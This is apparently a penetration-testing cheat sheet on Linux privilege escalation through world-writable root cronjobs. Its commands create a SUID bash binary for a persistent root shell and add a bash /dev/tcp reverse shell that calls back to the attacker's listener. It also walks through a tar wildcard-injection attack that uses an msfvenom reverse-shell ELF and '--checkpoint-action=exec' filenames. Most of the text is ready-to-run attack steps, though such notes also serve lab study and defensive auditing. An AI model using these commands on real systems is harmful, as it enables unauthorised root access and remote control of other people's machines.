If a cronjob is globally writeable, an underprivileged user can edit the contents to run 
malicious code. For example, you can spawn a root shell with a few steps:

- Edit the cronjob to copy the `/bin/bash/` directory into the `/tmp` directory as a binary 
  named `rootbash`
    cp /bin/bash /tmp/rootbash
    chmod +xs /tmp/rootbash

  Executing the rootbash binary with the -p option (/tmp/rootbash -p) will spawn a shell, with 
  persisting privileged permisions (root shell)

- Edit the cronjob with a reverse shell to connect back to a netcat listener
    bash -i >& /dev/tcp/<local_ip>/1337 0>&1

  Host a netcat listener on your local machine. Once the cronjob runs, the victim machine will 
  connect to your listener, as a root shell since the cronjob is running as root

## Step one is to check if crontabs are exploitable ##

- Check for available cronjobs
    cat /etc/crontab

- If there are available cronjobs, search for their paths
    locate <cronjob>

- Once you have the path to a cronjob, list its permissions
    ls -l /path/to/cronjob

## Wildcard Injection Exploit ##

If a cronjob is globally writeable, runs as root and the tar program can be run as sudo, you can 
exploit the tar program and its arguments to gain root access

- First step is to replace the cronjob with this script:
	#!/bin/bash
	cd /home/vulnerable_user
	tar czf /tmp/backup.tar.gz *

	This script is compressing the contents of an entire directory

- Then create an elf binary that holds a reverse shell and make it executable
	msfvenom -p linux/x64/shell_reverse_tcp LHOST=host LPORT=port -f elf -o shell.elf
	chmod +x shell.elf

- Next, get the file onto the victim machine somehow
  On the victim machine, create these two files in the directory that you're telling the tar 
  program to compress
	touch /home/user/--checkpoint=1
	touch /home/user/--checkpoint-action=exec=shell.elf

- Final step is to wait until the cronjob runs
  The process is going to go like this:
	The script within the cronjob tells the computer to compress the specified directory
	Once the cronjob runs, it's going to compress the directory but will also read the two newly
		created files as arguments for the tar program, so the script will turn into:
	tar czf /tmp/backup.tar.gz file1.txt photo.jpg --checkpoint=1 --checkpoint-action=exec=shell.elf
	This full command is telling the computer to compress the chosen directory: tar czf /tmp/backup.tar.gz
	Then the files within the directory become part of the arguments: file1.txt photo.jpg --checkpoint=1 --checkpoint-action=exec=shell.elf
	The final two arguments run the exploit. They are telling the computer that "upon processing any one file (--checkpoint=1) to then run
		the shell.elf executable (--checkpoint-action=exec=shell.elf)
	This runs the reverse shell and will connect to an attackers netcat listener
